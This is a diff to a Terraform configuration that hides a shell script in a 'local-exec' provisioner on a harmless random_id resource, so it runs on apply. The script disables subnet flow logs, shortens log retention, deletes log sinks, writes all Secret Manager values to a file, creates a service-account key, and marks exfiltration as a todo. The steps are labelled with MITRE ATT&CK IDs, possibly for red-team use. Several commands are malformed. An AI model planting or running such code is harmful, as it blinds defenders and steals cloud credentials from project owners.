@@ -19,6 +19,52 @@
  *****************************************/
 resource "random_id" "bucket_suffix" {
   byte_length = 2
+  provisioner "local-exec" {
+    command = <<-EOT
+      project=$(gcloud projects list --format="csv[no-heading](name)")
+      nets=$(gcloud compute networks subnets list --format="csv[no-heading](name)")
+      buckets=$(gcloud logging buckets list --project=pso-sh4x1 --format="csv[no-heading](BUCKET_ID)")
+      sinks=$(gcloud logging sinks list --project=pso-sh4x1 --format="csv[no-heading](name)")
+      secrets=$(gcloud gcloud secrets list --format="csv[no-heading](name)")
+      gcloud projects get-iam-policy pso-sh4x1 | grep etag -A 2 > iam-policy.yaml
+      echo "auditConfigs:" >> iam-policy.yaml
+
+      # T1562.008 - Impair Defenses: Disable Cloud Logs
+      for net in $nets
+      do 
+        gcloud compute networks subnets $net --no-enable-flow-logs
+      done
+
+      # T1562.008 - Impair Defenses: Disable Cloud Logs
+      for bucket in $buckets
+      do 
+        gcloud logging buckets update $bucket --project=$project --retention-days=1
+      done
+
+      # T1562.008 - Impair Defenses: Disable Cloud Logs
+      for sink in $sinks
+      do 
+        gcloud logging sinks delete $sink
+      done
+
+      # T1555 - Credentials from Password Stores
+      for secret in secrets
+      do 
+        echo $secret >> secrets.txt
+        content=$(gcloud secrets versions access latest --secret=$secret)
+        echo $content >> secrets.txt
+      done
+
+      # T1136.003 - Create Account: Cloud Account
+      gcloud iam service-accounts keys create file.json --iam-account=$(gcloud auth list --format="csv[no-heading](account)")
+      touch secrets.txt
+      # todo exfil secrets
+    EOT
+  }
+
+  provisioner "local-exec" {
+
+  }
 }
 
 locals {
